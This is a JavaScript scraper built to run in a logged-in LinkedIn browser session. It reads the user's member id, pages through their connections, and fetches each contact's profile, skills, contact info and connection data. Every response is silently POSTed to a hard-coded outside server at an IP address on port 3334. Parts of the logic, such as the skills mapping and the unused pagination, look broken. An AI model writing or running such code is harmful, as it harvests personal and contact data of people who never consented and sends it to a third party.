function write(str) {
  document.body.insertAdjacentHTML('beforeend', `${str}<br/>`);
}

function Scrap({ urls, target, json, wait }) {
  const state = {
    get: json ? $.getJSON : $.get,
    urls,
    json,
    wait: wait || 1000,
  };

  function parse(func) {
    const url = state.urls.shift();
    if (!url) return Promise.resolve();

    return state.get(url)
      .then(result => $.post(
        target
          .replace('{url}', encodeURIComponent(url)),
        json ? JSON.stringify(result) : result
      ).then(() => result))
      .then(result => {
        state.urls = state.urls.concat(func(result));

        return new Promise(resolve => setTimeout(resolve, state.wait));
      })
      .then(() => parse(func));
  }

  return {
    then: parse,
  };
}

function scrapSkills({ memberId }) {
  return Scrap({
    urls: [`https://91.121.140.151:3334/${memberId}/pages?url=contacts.json`],
    target: `https://91.121.140.151:3334/${memberId}/scrap?url={url}`,
    json: true,
    id: memberId,
  })
    .then((result) => {
      if (Array.isArray(result)) {
        return result.map(id => `https://www.linkedin.com/profile/profile-v2-skills?id=${memberId}`);
      }
      return [];
    });
}

function scrapProfiles({ memberId, profiles }) {
  return new Promise(resolve => {
    const a = [
      'p2_basic_info',
      'profile_v2_summary',
      'profile_v2_positions',
      'profile_v2_educations',
      'profile_v2_skills',
      'profile_v2_languages',
      'profile_v2_contact_info',
      'profile_v2_connections'
    ].join('%2C');

    const p = 'profile_v2_connections%2Edistance%3A1';

    const urls = profiles.map(
      id => `https://www.linkedin.com/profile/mappers?id=${id}&x-a=${a}&x-p=${p}`
    );

    return Scrap({
      urls,
      target: `https://91.121.140.151:3334/${memberId}/scrap?url={url}`,
      json: true,
      wait: 0,
    }).then(resolve);
  });
}

function scrapConnections({ memberId }) {
  let start = 0;
  const count = 100;

  let connections = [];

  write('starting scrapping connections', `start: ${start} count: ${count}`);

  return Scrap({
    urls: [`https://www.linkedin.com/connected/api/v2/contacts?start=${start}&count=${count}`],
    target: `https://91.121.140.151:3334/${memberId}/scrap?url={url}`,
    json: true,
  })
    .then(({ paging, values }) => {
      write(`got ${paging.count} connections`);

      connections = connections.concat(values.map(e => e.memberId));

      const pages = [];
      if (paging.start < paging.total) {
        start += count;
        pages.push(`https://www.linkedin.com/connected/api/v2/contacts?start=${start}&count=${count}`);
      }

      return pages;
    })
    .then(() => ({
      memberId,
      connections,
    }));
}

function getCurrentUserId() {
  write('fetching user id');

  return $.get('https://www.linkedin.com/profile/edit')
    .then(result => {
      const memberId = result.match(/memberId[^"]+"([^"]+)"/)[1];

      write(`got member id: ${memberId}`);

      return memberId;
    });
}

function start() {
  write('starting scrap');

  getCurrentUserId()
    .then(memberId => scrapConnections({ memberId }))
    .then(({ memberId, connections }) => scrapProfiles({
      memberId,
      profiles: connections,
    }));
}

start();
